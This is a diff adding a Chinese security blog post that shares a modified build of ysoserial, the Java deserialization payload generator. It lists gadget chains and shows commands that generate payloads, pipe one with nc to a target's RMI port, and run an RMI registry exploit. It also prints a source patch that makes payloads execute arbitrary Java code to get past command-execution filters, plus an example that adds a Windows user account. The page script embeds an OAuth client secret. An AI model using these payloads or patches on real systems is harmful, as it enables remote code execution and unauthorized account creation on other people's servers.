@@ -1,0 +1,426 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="ysoserial">
+
+
+<meta name="description" content="很久没用过这工具了，最近发现ysoserial在2个月前有更新过即最新版本是2021年1月，于是使用jdk1.7和1.8重新编译,顺便分享一下，也算是备份，免得哪天用到又得重新编译。
+简介
+ys...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖工具〗ysoserial修改版支持代码生成Payload |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖工具〗ysoserial修改版支持代码生成Payload">
+            
+            〖工具〗ysoserial修改版支持代码生成Payload
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/tool/">tool</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/ysoserial/" rel="tag">ysoserial</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/03/27</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1483</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>很久没用过这工具了，最近发现ysoserial在2个月前有更新过即最新版本是2021年1月，于是使用jdk1.7和1.8重新编译,顺便分享一下，也算是备份，免得哪天用到又得重新编译。</p>
+<h3 id="简介">简介</h3>
+<p>ysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。一般该工具可生成执行任意命令的序列化对象，通过对工具代码进行简单修改，也可使其执行任意的Java代码，以此来绕过对命令执行的限制。</p>
+<p>主页：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<h3 id="用法">用法</h3>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> java -jar ysoserial.jar</span></span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial.jar [payload] '[command]'</span><br><span class="line">  Available payload types:</span><br><span class="line">     Payload             Authors                     Dependencies</span><br><span class="line">     -------             -------                     ------------</span><br><span class="line">     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2</span><br><span class="line">     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5</span><br><span class="line">     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11</span><br><span class="line">     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0</span><br><span class="line">     Clojure             @JackOfMostTrades           clojure:1.8.0</span><br><span class="line">     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2</span><br><span class="line">     CommonsCollections1 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections2 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections3 @frohoff                    commons-collections:3.1</span><br><span class="line">     CommonsCollections4 @frohoff                    commons-collections4:4.0</span><br><span class="line">     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span><br><span class="line">     CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span><br><span class="line">     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br><span class="line">     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4</span><br><span class="line">     Groovy1             @frohoff                    groovy:2.3.9</span><br><span class="line">     Hibernate1          @mbechler</span><br><span class="line">     Hibernate2          @mbechler</span><br><span class="line">     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     JRMPClient          @mbechler</span><br><span class="line">     JRMPListener        @mbechler</span><br><span class="line">     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1</span><br><span class="line">     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21</span><br><span class="line">     Jdk7u21             @frohoff</span><br><span class="line">     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2</span><br><span class="line">     MozillaRhino1       @matthias_kaiser            js:1.7R2</span><br><span class="line">     MozillaRhino2       @_tint0                     js:1.7R2</span><br><span class="line">     Myfaces1            @mbechler</span><br><span class="line">     Myfaces2            @mbechler</span><br><span class="line">     ROME                @mbechler                   rome:1.0</span><br><span class="line">     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE</span><br><span class="line">     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2</span><br><span class="line">     URLDNS              @gebl</span><br><span class="line">     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14</span><br><span class="line">     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="例子">例子</h3>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd</span></span><br><span class="line">0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl</span><br><span class="line">0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A</span><br><span class="line">0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat</span><br><span class="line">...</span><br><span class="line">0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov</span><br><span class="line">0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........</span><br><span class="line">0000570: 0078 7071 007e 003a                      .xpq.~.:</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 10.10.10.10 1099 &lt; groovypayload.bin</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="编译">编译</h3>
+<p>Requires Java 1.7+ and Maven 3.x+</p>
+<p><code>mvn clean package -DskipTests</code></p>
+<h3 id="修改让其支持代码生成payload">修改让其支持代码生成payload</h3>
+<p>ysoserial/src/main/java/ysoserial/payloads/util/Gadgets.java<br>
+作者在115行的注释写到： TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</p>
+<p>将第117行替换成以下内容编译即可,注意把中文注释去掉，免得编译不了</p>
+<pre><code class="language-Java">String cmd="";
+//如果以code:开头，认为是代码，否则认为是命令
+if(!command.startsWith("code:")){
+cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+	command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+	"\");";}
+	else{
+	System.err.println("Java Code Mode:"+command.substring(5));//使用stderr输出，防止影响payload的输出
+	cmd = command.substring(5);
+}
+​```
+
+#### 使用命令生成
+​```Bash
+java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 "cmd /c net user k8gege 520 /add" &gt; 1.class
+​```
+
+#### 使用代码生成
+​```Bash
+java -jar ysoserial-0.0.6-SNAPSHOT-all-code-1.7.jar CommonsCollections2 "code:new java.io.FileOutputStream(\"test\").write(107);" &gt; 1.class
+​```
+
+![使用http访问查看图片](/k8img/k8img/posts/ysoserial-code.PNG)
+
+
+#### 支持代码生成的Payload
+由于不是所有的payload在构造时都调用了Gadgets.createTemplatesImpl,所以只有以下几种适用于以上修改。
+
+ROME
+
+CommonsBeanutils1
+
+CommonsCollections2
+
+CommonsCollections3
+
+CommonsCollections4
+
+Spring1
+
+Spring2
+
+Jdk7u21
+
+MozillaRhino1
+
+JBossInterceptors1
+
+JavassistWeld1
+
+JSON1
+
+Hibernate1
+
+### 下载
+由于编译好的文件较大56.8M，无法上传github，已将1.7和1.8编译好的最新版JAR文件RAR分卷压缩上传至"K8小密圈"
+
+
+
+
+</code></pre>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/portmap.html" class="pre-post btn btn-default" title="〖教程〗K8PortMap使用-MSF渗透内网MS17010">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖教程〗K8PortMap使用-MSF渗透内网MS17010</span>
+    </a>
+    
+    
+    <a href="/p/CVE-2021-26855.html" class="next-post btn btn-default" title="〖教程〗Ladon内网扫描检测CVE-2021-26855漏洞">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖教程〗Ladon内网扫描检测CVE-2021-26855漏洞</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%AE%A9%E5%85%B6%E6%94%AF%E6%8C%81%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90payload"><span class="toc-text">修改让其支持代码生成payload</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
